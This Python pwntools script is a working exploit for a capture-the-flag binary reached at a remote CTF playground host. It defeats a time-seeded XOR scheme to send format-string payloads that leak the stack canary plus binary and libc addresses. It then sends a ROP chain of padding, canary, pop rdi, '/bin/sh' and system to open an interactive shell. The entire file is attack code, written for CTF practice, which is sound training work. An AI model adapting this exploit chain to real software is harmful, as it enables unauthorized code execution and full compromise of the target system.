#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL
import time

exe = ELF("./chall_patched")
libc = CDLL('./libc.so.6')
libc_2 = ELF("./libc.so.6")

context.binary = exe

IMPORTANT_LEAK = ["%21$p","%23$p","%15$p"]

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("playground.tcp1p.team",19121)

    return r

import re

def extract_ptr(s):
    match = re.search(rb'0x[0-9a-fA-F]+', s)
    if match:
        return match.group(0)
    return b"INVALID"


def encrypt_prng(message):
    seed = libc.time(0x0)
    libc.srand(seed)
    key = libc.rand() % 0x100

    # Ensure message is bytes
    if isinstance(message, str):
        message = message.encode()

    log.info(f"the normal text {message}")
    decrypted = bytes([b ^ key for b in message])
    log.info(f"The encryptted : {decrypted}")
    return decrypted

leak = []

def main():
    r = conn()
    e = 1
    for i in IMPORTANT_LEAK:
        r.sendlineafter(b"> ","2")
        payload = encrypt_prng(i)
        r.sendline(payload)
        r.recvuntil(b"hai : ")
        # 
        leak.append(r.recvline().strip())
        e += 1
    canary = int(extract_ptr(leak[0]).decode(),16)
    main_120 = int(extract_ptr(leak[1]).decode(),16)
    atoi_16 = int(extract_ptr(leak[2]).decode(),16)
    log.info(f"Leak Canary     : {hex(canary)}")
    log.info(f"Leak Main+120   : {hex(main_120)}")
    log.info(f"Leak Atoi+16  : {hex(atoi_16)}")
    exe.address = main_120 - 0x152b
    libc_2.address = atoi_16 - 0x43654
    log.info(f"The Base Address : {hex(exe.address)}")
    log.info(f"The Base Libc Address : {hex(libc_2.address)}")
    rop = ROP(libc_2)
    rdi = libc_2.address + 0x000000000002a3e5
    bin_sh = libc_2.address + 0x1d8678
    system = libc_2.address + 0x0000000000050d70
    ret = libc_2.address + 0x0000000000029139
    rop.raw(b"A" * 72)
    rop.raw(canary)
    rop.raw(b"B" * 8)
    rop.raw(rdi)
    rop.raw(bin_sh)
    rop.raw(ret)
    rop.raw(system)
    # good luck pwning :)
    # time.sleep(15)
    r.sendline("1")
    r.sendline(rop.chain())
    r.interactive()


if __name__ == "__main__":
    main()
